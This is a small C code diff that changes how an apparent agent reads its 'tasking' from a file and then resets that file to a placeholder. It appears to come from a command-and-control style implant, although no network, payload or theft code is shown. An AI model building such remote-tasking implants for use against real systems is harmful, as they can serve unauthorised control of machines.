@@ -27,7 +27,7 @@ void init_agent(char *agent_id){
 void write_format(char *path){
     FILE *fd;
     fd = fopen(path, "w");
-    fwrite("NULL :)", 1, sizeof("NULL :)"), fd);
+    fwrite("NULL :)\n", 1, sizeof("NULL :)"), fd);
     fclose(fd);
 }
 
@@ -46,8 +46,8 @@ int get_tasking(char *agent_id, char *tasking){
     fread(mem_dump, 1, size, fd);
     fclose(fd);
 
-    //strcat(tasking, mem_dump);
-    strcat(tasking, "NULL :)");
+    strcat(tasking, mem_dump);
+    //strcat(tasking, "NULL :)");
     write_format(file);
     return 0;
 }
